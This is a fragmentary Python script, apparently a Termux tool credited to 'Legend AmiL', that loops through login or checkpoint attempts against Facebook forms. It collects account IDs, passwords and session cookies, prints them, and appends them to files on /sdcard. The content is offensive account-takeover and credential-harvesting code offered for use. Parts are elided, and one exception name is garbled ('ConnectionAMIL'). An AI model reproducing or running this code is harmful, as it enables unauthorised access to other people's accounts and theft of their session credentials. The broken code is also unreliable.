...
sys.stdout.write('\x1b]2;<💚AMIL💚>\x07')
...
\x1b[1;91m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝ \033[92m
\x1b[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
\x1b[1;91m[\\]\x1b[1;97m This Tools Decode By Legend AmiL
\x1b[1;91m[\\] \x1b[1;97mUpdate by Legend AmiL
\x1b[1;91m[\\] \x1b[1;97mCoder Name > AmiL
...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ SEIF ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#        
    def start(self):
        ...
        for x in range(lim):
            self.loop += 1
            sys.stdout.write(f'\r\r{A}[{G}AMIL-AUTO{A}] >> {A}[{R}{self.loop}{A}]{R} >> {A}[{G}OK{A}•{G}{len(ok)}{A}]')
            sys.stdout.flush()
            ...
            try:
                ...
                pass
            except requests.exceptions.ConnectionAMIL:
                time.sleep(1)
                pass
                        ...
                        for x in BeautifulSoup(po.text, 'html.parser').find_all('form', {'method': 'post'}):
                            if 'confirmation_event_location=cliff' in str(x):
                                ...
                                if 'checkpoint' in rex.url:
                                    ...
                                    cok = self.ses.cookies.get_dict()
                                    print(f'\r\x1b[38;5;46m{A}[{G}AMIL-OK💉{A}]{G} '+cok['c_user']+' | '+passw+'')
                                    print(f'\r{R}[{G}COOKIE{R}]{G}━{R}>{BU} '+coki)
                                    linex()
                                    open("/sdcard/AMIL-AUTO-COOKIE.txt","a").write(cok['c_user']+"|"+passw+"|"+coki+"\n")
                                    open('/sdcard/AMIL-AUTO-UID.txt','a').write(cok['c_user']+'|'+passw+'\n')
